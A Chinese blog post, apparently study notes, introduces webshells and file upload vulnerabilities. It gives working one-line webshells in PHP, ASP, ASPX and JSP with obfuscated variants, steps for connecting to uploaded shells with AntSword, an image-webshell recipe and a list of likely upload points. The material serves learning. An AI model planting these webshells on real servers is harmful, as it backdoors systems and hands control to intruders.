{"title":"web安全之文件上传漏洞","uid":"018e7a0983ad8b88508f4c4d22944055","slug":"web安全之文件上传漏洞","date":"2022-11-18T03:42:30.349Z","updated":"2022-11-18T10:57:43.772Z","comments":true,"path":"api/articles/web安全之文件上传漏洞.json","keywords":null,"cover":"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typorawallhaven-3961j9_1920x1080.png","content":"<h2 id=\"webshell概述\"><a href=\"#webshell概述\" class=\"headerlink\" title=\"webshell概述\"></a>webshell概述</h2><h3 id=\"什么是webshell\"><a href=\"#什么是webshell\" class=\"headerlink\" title=\"什么是webshell\"></a>什么是webshell</h3><h4 id=\"概念\"><a href=\"#概念\" class=\"headerlink\" title=\"概念\"></a>概念</h4><p>webshell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门。黑客在入侵了一个网站后，通常会将asp或php后门文件与网站服务器WEB目录下正常的网页文件混在一起，然后就可以使用浏览器来访问asp或者php后门，得到一个命令执行环境，以达到控制网站服务器的目的。</p>\n<p>顾名思义，“web”的含义是显然需要服务器开放web服务，“shell”的含义是取得对服务器某种程度上操作权限。webshell常常被称为入侵者通过网站端口对网站服务器的某种程度上操作的权限。由于webshell其大多是以动态脚本的形式出现，也有人称之为网站的后门工具。</p>\n<h4 id=\"种类\"><a href=\"#种类\" class=\"headerlink\" title=\"种类\"></a>种类</h4><p>  一句话木马、小马、大马、打包马、脱库马、等等</p>\n<p><strong>一句话木马</strong></p>\n<p>介绍：</p>\n<p>一句话木马短小精悍，而且功能强大，隐蔽性非常好，在入侵中始终扮演着强大的作用。</p>\n<p>例子：</p>\n<p>asp一句话木马：<code>&lt;%eval request(&quot;c&quot;)%&gt;</code></p>\n<p>php一句话木马：<code> &lt;?php @eval($_POST[value]);?&gt;</code></p>\n<p>php一句话木马：<code>&lt;?php $a=$_REQUEST[1]; eval($a);?&gt;</code></p>\n<p>aspx一句话木马：<code>&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;value&quot;])%&gt;</code></p>\n<p>jsp一句话：</p>\n<p><code>&lt;%if(request.getParameter(&quot;f&quot;)!=null)(newjava.io.FileOutputStream(application.getRealPath(&quot;/&quot;)+request.getParameter(&quot;f&quot;))).write(request.getParameter(&quot;t&quot;).getBytes());%&gt;</code> </p>\n<p>变形：</p>\n<p><code>&lt;?php $_REQUEST[&#39;a&#39;]($_REQUEST[&#39;b&#39;]); ?&gt;</code></p>\n<p><code>&lt;%Eval(Request(chr(112)))%&gt;</code></p>\n<p><code>&lt;%eval (eval(chr(114)+chr(101)+chr(113)+chr(117)+chr(101)+chr(115)+chr(116))(&quot;xindong&quot;))%&gt;</code></p>\n<p><code>&lt;%eval&quot;&quot;&amp;(&quot;e&quot;&amp;&quot;v&quot;&amp;&quot;a&quot;&amp;&quot;l&quot;&amp;&quot;(&quot;&amp;&quot;r&quot;&amp;&quot;e&quot;&amp;&quot;q&quot;&amp;&quot;u&quot;&amp;&quot;e&quot;&amp;&quot;s&quot;&amp;&quot;t&quot;&amp;&quot;(&quot;&amp;&quot;0&quot;&amp;&quot;-&quot;&amp;&quot;2&quot;&amp;&quot;-&quot;&amp;&quot;5&quot;&amp;&quot;)&quot;&amp;&quot;)&quot;)%&gt;</code></p>\n<p><code>&lt;%a=request(&quot;gold&quot;)%&gt;&lt;%eval a%&gt;</code></p>\n<p><strong>一句话木马管理软件</strong></p>\n<p>蚁剑，菜刀等，这里介绍蚁剑</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20221118115000524.png\" alt=\"image-20221118115000524\"></p>\n<p>右键添加数据</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20221118115035978.png\" alt=\"image-20221118115035978\"></p>\n<p>填入你上传一句话木马的网站的url和连接密码（参数）</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimg_for_typoraimage-20221118113611228.png\" alt=\"image-20221118115000524\"></p>\n<p>测试连接</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20221118115436372.png\" alt=\"image-20221118115436372\"></p>\n<p>然后就获取后台权限了</p>\n<p><strong>小马</strong></p>\n<p>小马体积小，容易隐藏，隐蔽性强，最重要在于与图片结合一起上传之后可以利用nginx或者IIS6的解析漏洞来运行，不过功能少，一般只有上传或者命令执行等功能。</p>\n<p><strong>大马</strong></p>\n<p>网站管理工具</p>\n<p>用途：提权、打包、脱裤、增删文件</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20221118115801351.png\" alt=\"image-20221118115801351\"></p>\n<p>成功上传大马</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20221118115836240.png\" alt=\"image-20221118115836240\"></p>\n<p>访问大马的文件路径</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20221118115933423.png\" alt=\"image-20221118115933423\"></p>\n<p>输入密码（一般在你大马的源码里）</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20221118120115383.png\" alt=\"image-20221118120115383\"></p>\n<p>得到相应权限</p>\n<p><strong>图片马</strong></p>\n<p>把webshell通过二进制的方式写入图片中，即不影响图片本身浏览，又能在图片被包含时解析，或者直接将后缀修改成asp&#x2F;php时亦能解析。</p>\n<p>•把下列这行代码写进1.php文件中</p>\n<?php @eval($_POST['cmd']);?>\n\n<p>•然后利用copy命令生成图片马</p>\n<p>copy 1.jpg &#x2F;b + 1.php  2.jpg</p>\n<h2 id=\"文件上传漏洞概述\"><a href=\"#文件上传漏洞概述\" class=\"headerlink\" title=\"文件上传漏洞概述\"></a>文件上传漏洞概述</h2><h4 id=\"概述：\"><a href=\"#概述：\" class=\"headerlink\" title=\"概述：\"></a>概述：</h4><p>​\tWEB应用程序通常会有文件上传的功能，例如：在BBS发布图片、在个人网站发布ZIP压缩包、在招聘网站上发布DOC格式简历等。只要WEB应用程序允许上传文件，就有可能存在文件上传漏洞。在不对被上传的文件进行限制或者限制被绕过，该功能便有可能被利用于上传可执行文件、脚本到服务器上，从而进一步导致服务器沦陷。</p>\n<p>​    如何确认WEB应用程序是否存在上传漏洞呢？比如：一个BBS论坛，由PHP语言开发，用户可以上传个性头像，也就是图片文件，但文件上传时候并没有对图片格式做验证，导致用户可以上传任意文件，那么这就是一个上传漏洞，总之就是上传的文件被成功当做脚本解析，就代表有文件上传漏洞。</p>\n<h4 id=\"如何找到上传点\"><a href=\"#如何找到上传点\" class=\"headerlink\" title=\"如何找到上传点\"></a>如何找到上传点</h4><p>Web前台</p>\n<ul>\n<li><p>暴露的编辑器URL</p>\n</li>\n<li><p>图片&#x2F;头像上传</p>\n</li>\n<li><p>已知CMS漏洞</p>\n<ul>\n<li><p>CLTPHP_v5.5.3任意文件上传漏洞</p>\n</li>\n<li><p>PHPCMS_v9.6.0任意文件上传漏洞</p>\n</li>\n</ul>\n</li>\n</ul>\n<p>Web后台</p>\n<ul>\n<li>集成的编辑器</li>\n<li>文章发布</li>\n<li>文件管理器</li>\n<li>其它上传功能</li>\n</ul>\n<p>Web中间件&#x2F;服务器</p>\n<ul>\n<li>“PUT”上传漏洞</li>\n<li>Tomcat后台弱口令部署WAR包</li>\n<li>Weblogic文件上传漏洞（如CVE-2018-2894）<br>工具</li>\n<li>基于字典的扫描器</li>\n<li>爬虫</li>\n</ul>\n","text":"webshell概述什么是webshell概念webshell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门。黑客在入侵了一个网站后，通常会将asp或php后门文件与网站服务器WEB目录下正常的网页文件混在一起，然后就可以...","link":"","photos":[],"count_time":{"symbolsCount":"2.4k","symbolsTime":"2 mins."},"categories":[{"name":"学习笔记","slug":"学习笔记","count":12,"path":"api/categories/学习笔记.json"}],"tags":[{"name":"文件上传漏洞","slug":"文件上传漏洞","count":1,"path":"api/tags/文件上传漏洞.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#webshell%E6%A6%82%E8%BF%B0\"><span class=\"toc-text\">webshell概述</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%BB%80%E4%B9%88%E6%98%AFwebshell\"><span class=\"toc-text\">什么是webshell</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%A6%82%E5%BF%B5\"><span class=\"toc-text\">概念</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E7%A7%8D%E7%B1%BB\"><span class=\"toc-text\">种类</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0\"><span class=\"toc-text\">文件上传漏洞概述</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%A6%82%E8%BF%B0%EF%BC%9A\"><span class=\"toc-text\">概述：</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%A6%82%E4%BD%95%E6%89%BE%E5%88%B0%E4%B8%8A%E4%BC%A0%E7%82%B9\"><span class=\"toc-text\">如何找到上传点</span></a></li></ol></li></ol></li></ol>","author":{"name":"Abyssaler","slug":"blog-author","avatar":"https://pic.kts.g.mi.com/551ced5839599747048c3c99a9d47df4203311636470612235.jpg","link":"/","description":"道阻且长，行则将至","socials":{"github":"https://github.com/Abyssaler","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/weixin_45349299","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"ctf笔记之wake_php","uid":"1a613abcdf9c626b905ba0d768be1622","slug":"ctf之wake_php","date":"2022-11-19T17:17:07.600Z","updated":"2022-11-20T04:47:40.791Z","comments":true,"path":"api/articles/ctf之wake_php.json","keywords":null,"cover":"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typorawallhaven-5wm9o7_1920x1080.png","text":"源码： &lt;?php highlight_file(__FILE__); include(&quot;password.php&quot;); if(isset($_POST[&#39;password&#39;])) &#123; if(strcmp($_POST[&#39...","link":"","photos":[],"count_time":{"symbolsCount":"4.5k","symbolsTime":"4 mins."},"categories":[{"name":"学习笔记","slug":"学习笔记","count":12,"path":"api/categories/学习笔记.json"}],"tags":[{"name":"php","slug":"php","count":8,"path":"api/tags/php.json"},{"name":"ctf","slug":"ctf","count":1,"path":"api/tags/ctf.json"}],"author":{"name":"Abyssaler","slug":"blog-author","avatar":"https://pic.kts.g.mi.com/551ced5839599747048c3c99a9d47df4203311636470612235.jpg","link":"/","description":"道阻且长，行则将至","socials":{"github":"https://github.com/Abyssaler","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/weixin_45349299","juejin":"","customs":{}}}},"next_post":{"title":"CTFhub之web安全","uid":"b97648e041829a6ba4fa127fa718e3d4","slug":"CTFhub之web练习","date":"2022-11-18T02:44:23.845Z","updated":"2022-11-18T12:02:47.072Z","comments":true,"path":"api/articles/CTFhub之web练习.json","keywords":null,"cover":"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typorawallhaven-73v6e9_1920x1080.png","text":"1.文件上传之双写后缀 双写绕过原理： 服务端对黑名单中的内容进行处理，且仅处理一次，所以可以通过双写后缀绕过．如，黑名单中有＂php＂字样，上传文件名为＂1.php＂ 上传后文件变成＂1.＂． 如果直接上传111.php的话，会过滤后缀 想到用burp suite抓包改后缀 如...","link":"","photos":[],"count_time":{"symbolsCount":"7.2k","symbolsTime":"7 mins."},"categories":[{"name":"CTF","slug":"CTF","count":1,"path":"api/categories/CTF.json"}],"tags":[{"name":"ctfhub","slug":"ctfhub","count":1,"path":"api/tags/ctfhub.json"}],"author":{"name":"Abyssaler","slug":"blog-author","avatar":"https://pic.kts.g.mi.com/551ced5839599747048c3c99a9d47df4203311636470612235.jpg","link":"/","description":"道阻且长，行则将至","socials":{"github":"https://github.com/Abyssaler","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/weixin_45349299","juejin":"","customs":{}}}}}